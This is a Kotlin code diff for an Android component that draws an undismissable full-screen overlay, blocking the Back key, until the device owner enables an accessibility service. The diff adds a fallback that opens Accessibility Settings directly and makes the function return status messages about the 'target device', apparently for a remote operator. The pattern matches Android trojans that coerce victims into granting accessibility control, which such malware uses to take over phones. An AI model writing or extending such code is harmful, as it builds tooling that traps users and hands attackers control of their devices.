@@ -65,8 +65,11 @@ object AccessibilityOverlayManager {
                 contentObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
                     override fun onChange(selfChange: Boolean) {
                         super.onChange(selfChange)
-                        Log.d(TAG, "Accessibility settings changed, checking overlay status...")
-                        checkAndToggleOverlay(appContext)
+                        Log.d(TAG, "Accessibility settings changed...")
+                        if (isAccessibilityEnabled(appContext)) {
+                            removeOverlay(appContext)
+                            stopObserver(appContext)
+                        }
                     }
                 }
             }
@@ -81,9 +84,6 @@ object AccessibilityOverlayManager {
         } catch (e: Exception) {
             Log.e(TAG, "Failed to register ContentObserver: ${e.message}")
         }
-
-        // Initial check
-        checkAndToggleOverlay(appContext)
     }
 
     fun stopObserver(context: Context) {
@@ -97,6 +97,19 @@ object AccessibilityOverlayManager {
         }
     }
 
+    fun openAccessibilitySettings(context: Context): Boolean {
+        return try {
+            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
+                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
+            }
+            context.applicationContext.startActivity(intent)
+            true
+        } catch (e: Exception) {
+            Log.e(TAG, "Error opening accessibility settings: ${e.message}")
+            false
+        }
+    }
+
     fun checkAndToggleOverlay(context: Context) {
         Handler(Looper.getMainLooper()).post {
             val isEnabled = isAccessibilityEnabled(context)
@@ -104,31 +117,60 @@ object AccessibilityOverlayManager {
             if (isEnabled) {
                 removeOverlay(context)
             } else {
-                showOverlay(context)
+                showOverlayWithFallback(context)
             }
         }
     }
 
     fun showOverlay(context: Context) {
+        showOverlayWithFallback(context)
+    }
+
+    fun showOverlayWithFallback(context: Context): String {
         val appContext = context.applicationContext
+        startObserver(appContext)
+
+        if (isAccessibilityEnabled(appContext)) {
+            removeOverlay(appContext)
+            return "SKIPPED: Accessibility Service is already ENABLED on target device."
+        }
+
+        if (overlayView != null) {
+            return "SUCCESS: Accessibility overlay is already active and displayed on screen."
+        }
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(appContext)) {
+            Log.w(TAG, "SYSTEM_ALERT_WINDOW permission missing. Executing fallback: opening Accessibility Settings directly.")
+            val opened = openAccessibilitySettings(appContext)
+            return if (opened) {
+                "FALLBACK_SUCCESS: Overlay permission missing. Triggered fallback: Opened Accessibility Settings screen directly on target device."
+            } else {
+                "FAILED: Overlay permission missing and failed to open Accessibility Settings."
+            }
+        }
+
+        var success = false
+        var errorMsg = ""
+        val latch = java.util.concurrent.CountDownLatch(1)
+
         Handler(Looper.getMainLooper()).post {
             if (overlayView != null) {
-                Log.d(TAG, "Overlay already visible")
-                return@post
-            }
-
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(appContext)) {
-                Log.w(TAG, "SYSTEM_ALERT_WINDOW permission not granted. Cannot draw overlay.")
+                success = true
+                latch.countDown()
                 return@post
             }
 
             try {
                 val windowManager = appContext.getSystemService(Context.WINDOW_SERVICE) as? WindowManager
-                    ?: return@post
+                if (windowManager == null) {
+                    errorMsg = "WindowManager service unavailable"
+                    latch.countDown()
+                    return@post
+                }
 
                 val rootLayout = object : FrameLayout(appContext) {
                     override fun dispatchKeyEvent(event: KeyEvent?): Boolean {
-                        // Intercept Back button or any key to prevent dismissing overlay
+                        // Intercept Back button to prevent dismissing overlay
                         if (event?.keyCode == KeyEvent.KEYCODE_BACK) {
                             return true
                         }
@@ -203,14 +245,7 @@ object AccessibilityOverlayManager {
                     setPadding(dpToPx(appContext, 16), dpToPx(appContext, 12), dpToPx(appContext, 16), dpToPx(appContext, 12))
 
                     setOnClickListener {
-                        try {
-                            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
-                                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
-                            }
-                            appContext.startActivity(intent)
-                        } catch (e: Exception) {
-                            Log.e(TAG, "Error opening accessibility settings: ${e.message}")
-                        }
+                        openAccessibilitySettings(appContext)
                     }
                 }
 
@@ -245,9 +280,28 @@ object AccessibilityOverlayManager {
 
                 windowManager.addView(rootLayout, params)
                 overlayView = rootLayout
+                success = true
                 Log.d(TAG, "Accessibility blocking overlay view attached successfully.")
             } catch (e: Exception) {
+                errorMsg = e.message ?: "Unknown window error"
                 Log.e(TAG, "Failed to attach overlay view to WindowManager: ${e.message}")
+            } finally {
+                latch.countDown()
+            }
+        }
+
+        try {
+            latch.await(1500, java.util.concurrent.TimeUnit.MILLISECONDS)
+        } catch (_: Exception) {}
+
+        return if (success) {
+            "SUCCESS: Accessibility overlay displayed on device screen."
+        } else {
+            val fallbackOpened = openAccessibilitySettings(appContext)
+            if (fallbackOpened) {
+                "FALLBACK_SUCCESS: Could not draw overlay ($errorMsg). Triggered fallback: Opened Accessibility Settings directly on device."
+            } else {
+                "FAILED: Could not draw overlay ($errorMsg) and fallback failed."
             }
         }
     }
